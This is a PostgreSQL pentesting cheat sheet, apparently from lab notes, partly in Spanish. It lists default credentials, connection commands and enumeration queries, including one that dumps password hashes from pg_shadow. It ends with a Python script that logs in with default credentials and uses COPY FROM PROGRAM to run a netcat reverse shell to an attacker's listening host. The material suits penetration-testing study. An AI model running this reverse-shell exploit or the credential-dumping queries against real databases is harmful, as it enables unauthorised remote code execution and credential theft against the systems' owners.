
## default users

| user     | pass     |
| -------- | -------- |
| postgres | postgres |
| postgres | password |

## connect

```sh
psql -h $IP -U postgres -W 
psql -h $IP -U postgres -d <database> 
psql -h <host> -p <port> -U postgres -W -d <database>`
```
## commands

```sh
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
Select user;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;

# Get history of commands executed
\s
```

## RCE

Ver permisos

```sql
\c postgres
```

- Codigo RCE
```py
#!/usr/bin/env python3
import psycopg2


RHOST = '192.168.201.47'
RPORT = 5437
LHOST = '192.168.45.204'
LPORT = 80
USER = 'postgres'
PASSWD = 'postgres'

with psycopg2.connect(host=RHOST, port=RPORT, user=USER, password=PASSWD) as conn:
    try:
        cur = conn.cursor()
        print("[!] Connected to the PostgreSQL database")
        rev_shell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
        print(f"[*] Executing the payload. Please check if you got a reverse shell!\n")
        cur.execute('DROP TABLE IF EXISTS cmd_exec')
        cur.execute('CREATE TABLE cmd_exec(cmd_output text)')
        cur.execute('COPY cmd_exec FROM PROGRAM \'' + rev_shell  + '\'')
        cur.execute('SELEC * from cmd_exec')
        v = cur.fetchone()
        #print(v)
        cur.close()

    except:
        print(f"[!] Something went wrong")
```

